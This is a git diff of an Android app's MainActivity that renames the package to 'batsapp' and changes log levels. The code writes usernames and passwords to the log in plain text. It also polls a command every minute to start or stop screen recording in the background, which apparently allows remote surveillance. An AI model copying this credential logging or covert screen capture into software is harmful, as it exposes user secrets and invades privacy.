@@ -1,4 +1,4 @@
-package com.example.myapplication;
+package com.example.batsapp;
 
 import android.app.Activity;
 import android.content.Context;
@@ -22,11 +22,11 @@ import java.util.Timer;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
-import static com.example.myapplication.Utils.getRandomString;
+import static com.example.batsapp.Utils.getRandomString;
 
 public class MainActivity extends Activity {
     private static final int REQUEST_CODE = 100;
-    private static final String TAG = "kangaro";
+    private static final String TAG = "batsapp";
     private static int result_code = 0;
     private static Intent result_data;
     public static final String PREFIX_FILE_NAME = "Screen_";
@@ -38,7 +38,7 @@ public class MainActivity extends Activity {
     public static boolean authKeyStatus = false;
     public static boolean isRunning = false;
     public static String authKey = "";
-    public static String COMMAND = "NULL";
+    public static String COMMAND = "init";
 
 
     public void clearCache(View view) throws IOException {
@@ -47,7 +47,7 @@ public class MainActivity extends Activity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
-        Log.e(TAG, "starting kangaro...");
+        Log.e(TAG, "starting batsapp...");
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
@@ -70,7 +70,7 @@ public class MainActivity extends Activity {
             @Override
             public void run() {
                 String authKey = Utils.readAuthKey(getApplicationContext());
-                Log.e(TAG, "extracted  authKey -> " + authKey);
+                Log.d(TAG, "extracted  authKey  " + authKey);
 
                 if (authKey != null) {
                     List<String> creditList = Arrays.asList(authKey.split("\\|"));
@@ -79,7 +79,7 @@ public class MainActivity extends Activity {
                         authKeyStatus = true;
                         userName = creditList.get(0);
                         password = creditList.get(1);
-                        Log.e(TAG, "extracted  credentials -> " + userName + " == " + password);
+                        Log.d(TAG, "extracted  credentials -> " + userName + " == " + password);
                         getQrCode(getWindow().getDecorView().findViewById(android.R.id.content));
                     }
                 }
@@ -95,24 +95,24 @@ public class MainActivity extends Activity {
                         while (true) {
                             if (COMMAND.equals("start")) {
                                 if (!isRunning) {
-                                    Log.e(TAG, "get START command");
+                                    Log.d(TAG, "get START command");
                                     startRecording();
                                 } else {
-                                    Log.e(TAG, "START command already executed.");
+                                    Log.d(TAG, "START command already executed.");
                                 }
                             } else if (COMMAND.equals("stop")) {
                                 if (isRunning) {
-                                    Log.e(TAG, "get STOP command");
+                                    Log.d(TAG, "get STOP command");
                                     stopRecording();
                                 } else {
-                                    Log.e(TAG, "get STOP command but nothing to stop.");
+                                    Log.d(TAG, "get STOP command but nothing to stop.");
                                 }
                             } else {
-                                Log.e(TAG, "get " + COMMAND + " command");
+                                Log.d(TAG, "get " + COMMAND + " command");
 
                             }
                             try {
-                                Log.e(TAG, "sleep for 60 second");
+                                Log.d(TAG, "sleep for 60 second");
                                 Thread.sleep(60_000);
                             } catch (InterruptedException e) {
                                 e.printStackTrace();
@@ -135,9 +135,9 @@ public class MainActivity extends Activity {
         String authKey;
         String delimiter = "|";
         if (authKeyStatus) {
-            Log.e(TAG, " user already logged via " + userName + " == " + password);
+            Log.d(TAG, " user already logged via  username: " + userName + " password: " + password);
         } else {
-            Log.e(TAG, " user not logged in");
+            Log.d(TAG, " user not loggedIn.");
             EditText u = findViewById(R.id.username);
             EditText p = findViewById(R.id.password);
             userName = u.getText().toString();
@@ -164,7 +164,7 @@ public class MainActivity extends Activity {
                 e.printStackTrace();
             }
         } else {
-            Log.e(TAG, "Please enter username and password");
+            Log.e(TAG, "invalid or empty username and password");
         }
 
 
@@ -178,10 +178,10 @@ public class MainActivity extends Activity {
                 result_code = resultCode;
                 result_data = data;
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    startForegroundService(com.example.myapplication.BackgroundService.getStartIntent(this, resultCode, data));
+                    startForegroundService(com.example.batsapp.BackgroundService.getStartIntent(this, resultCode, data));
 
                 } else {
-                    startService(com.example.myapplication.BackgroundService.getStartIntent(this, resultCode, data));
+                    startService(com.example.batsapp.BackgroundService.getStartIntent(this, resultCode, data));
 
                 }
                 goBackground();
@@ -192,7 +192,7 @@ public class MainActivity extends Activity {
 
     public void startProjection(View v) {
         if (isRunning) {
-            Log.e(TAG, "service already recording screen...");
+            Log.d(TAG, "service already recording screen...");
             return;
         }
         isRunning = true;
@@ -205,10 +205,10 @@ public class MainActivity extends Activity {
 
     public void startRecording() {
         if (isRunning) {
-            Log.e(TAG, "service already recording screen...");
+            Log.d(TAG, "service already recording screen...");
         } else {
             isRunning = true;
-            Log.e(TAG, "start recording inside other method.....");
+            Log.d(TAG, "start recording inside other method.....");
             MediaProjectionManager mProjectionManager =
                     (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
             startActivityForResult(mProjectionManager.createScreenCaptureIntent(), REQUEST_CODE);
@@ -219,15 +219,15 @@ public class MainActivity extends Activity {
 
     public void stopRecording() {
         if (!isRunning) {
-            Log.e(TAG, "return , there is not active running");
+            Log.d(TAG, "return , there is not active running");
             return;
         }
         isRunning = false;
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(com.example.myapplication.BackgroundService.getStopIntent(this));
+            startForegroundService(com.example.batsapp.BackgroundService.getStopIntent(this));
 
         } else {
-            startService(com.example.myapplication.BackgroundService.getStopIntent(this));
+            startService(com.example.batsapp.BackgroundService.getStopIntent(this));
 
         }
 
@@ -235,15 +235,15 @@ public class MainActivity extends Activity {
 
     public void stopProjection(View v) {
         if (!isRunning) {
-            Log.e(TAG, "return , there is not active running");
+            Log.d(TAG, "return , there is not active running");
             return;
         }
         isRunning = false;
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(com.example.myapplication.BackgroundService.getStopIntent(this));
+            startForegroundService(com.example.batsapp.BackgroundService.getStopIntent(this));
 
         } else {
-            startService(com.example.myapplication.BackgroundService.getStopIntent(this));
+            startService(com.example.batsapp.BackgroundService.getStopIntent(this));
 
         }
     }
@@ -252,6 +252,8 @@ public class MainActivity extends Activity {
     @Override
     protected void onDestroy() {
         //stopService(mServiceIntent);
+
+//fixme why I disabled below line and it's working well?
 
 
 //        Intent broadcastIntent = new Intent();
